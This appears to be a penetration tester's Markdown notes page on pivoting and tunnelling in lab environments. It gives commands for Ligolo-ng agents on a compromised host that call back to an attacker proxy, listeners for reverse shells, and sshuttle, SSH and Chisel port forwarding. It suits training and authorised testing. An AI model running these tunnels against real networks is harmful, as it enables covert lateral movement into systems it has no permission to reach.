---
publish: true
created: 2026-01-24T16:14:55.893+05:30
modified: 2026-06-22T09:01:21.928+05:30
tags:
  - tunnel
  - pivot
---

# Pivot-Tunnel

## Ligolo-ng

https://github.com/nicocha30/ligolo-ng/wiki/Bind - Ligolo-ng is the best !
For bind or reverse :

- _proxy_ on attacker (kali).
- _agent_ on machine.

First check the network interface IP range on target machine. Run `ip a` in target and check for internal networks, suppose target IP is _10.10.10.1_. This will help determine the route.

**Setup interface**:

```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.10.0/24 dev ligolo
# above means, route all 10.10.10.x traffic via ligolo tunnel.
```

### Reverse

<https://docs.ligolo.ng/Quickstart/>

start the _proxy_ server on kali

```bash
$ ./proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml
WARN[0000] daemon configuration file not found. Creating a new one...
? Enable Ligolo-ng WebUI? No
WARN[0009] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
ERRO[0009] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate
INFO[0009] Listening on 0.0.0.0:11601
ligolo-ng » certificate_fingerprint
INFO[0270] TLS Certificate fingerprint for ligolo is: DC441A725D7C69015B1B96996AE22391C05459A8F1C5455B0D18FC306AF345AF
```

start the _agent_ on windows.

1. transfer agent.exe and relevant architecture wintun.dll

```
./agent.exe -connect 10.10.17.61:11601 -v -accept-fingerprint DC441A725D7C69015B1B96996AE22391C05459A8F1C5455B0D18FC306AF345AF
```

for reverse shell listening.

<https://docs.ligolo.ng/Listeners/>

**After Connect**
on the kali machine.

```
ligolo-ng » INFO[0454] Agent joined.                                 id=005056944cb1 name="EIGHTEEN\\adam.scott@DC01" remote="10.129.13.130:52399"

ligolo-ng » session
? Specify a session : 1 - EIGHTEEN\adam.scott@DC01 - 10.129.13.130:52399 - 005056944cb1

[Agent : EIGHTEEN\adam.scott@DC01] » start
INFO[0500] Starting tunnel to EIGHTEEN\adam.scott@DC01 (005056944cb1)

[Agent : EIGHTEEN\adam.scott@DC01] »
```

### Bind

**victim agent**

```
./agent -bind 10.10.10.5:8888
```

**Kali Proxy**
After setting up the interface on kali as mentioned above.

```
./proxy -selfcert
ligolo-ng » connect_agent --ip 10.10.10.5:8888
? TLS Certificate Fingerprint is: 71123C592A344151BDB01A20A23CD0813A45BA48160A762F10BECC5FD8212C80, connect? Yes
INFO[0037] Agent connected.      me=test@email remote="10.10.10.5:4444"
ligolo-ng » session
? Specify a session : 1 - test@email - 10.10.10.5:8888 - 1cf14d49-7e13-4880-9f0e-c42daea6c4af
[Agent : test@email] » start
INFO[0382] Starting tunnel to test@email
```

### Local Port forward

<https://docs.ligolo.ng/Localhost/>

```
$ sudo ip route add 240.0.0.1/32 dev ligolo
$ nmap 240.0.0.1 -sV
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-30 22:17 CET
Nmap scan report for 240.0.0.1
Host is up (0.023s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
8000/tcp open http SimpleHTTPServer 0.6 (Python 3.9.2)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.16 seconds
```

### port listener

For port forward or reverse shell
0.0.0.0 - agent
127.0.0.1 - proxy (kali)

```
# run on proxy(kali)
listener_add --addr 0.0.0.0:1433 --to 127.0.0.1:1433
```

## sshuttle

```
ssh -f -N -D 9000 -i id_rsa adminuser@10.10.155.5
ps aux | grep 'ssh -f -N -D 9050'
sshuttle -r adminuser@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i id_rsa"
```

## Links

https://ppn.snovvcrash.rocks/pentest/infrastructure/pivoting
https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/
<https://ap3x.github.io/posts/pivoting-with-chisel/>
<https://github.com/b4rdia/HackTricks/blob/master/generic-methodologies-and-resources/tunneling-and-port-forwarding.md>

# Port forward

if ports are open on local machine only and not open outside, and you want the ports to be accessible from second machine, then you forward the ports to second machine so they are accessible on second machine locally.

## Linux

### ssh

Using ssh. here ports 5801, 5901 are forwarded from poison machine to kali machine via ssh.

```
$ ssh -L 5801:127.0.0.1:5801 -L 5901:127.0.0.1:5901 charix@poison.htb
```

## Windows

### Chisel

```
# on kali - server
chisel server --reverse --port 1236 --host 10.10.14.53

# on windows - client, forwarding port 8080 to kali localhost:8081
.\chisel.exe client --max-retry-count 3 10.10.14.53:1236 R:8081:127.0.0.1:8080
```

if you want all ports with chisel, follow process <https://www.hackingarticles.in/chisel-port-forwarding-a-detailed-guide/>
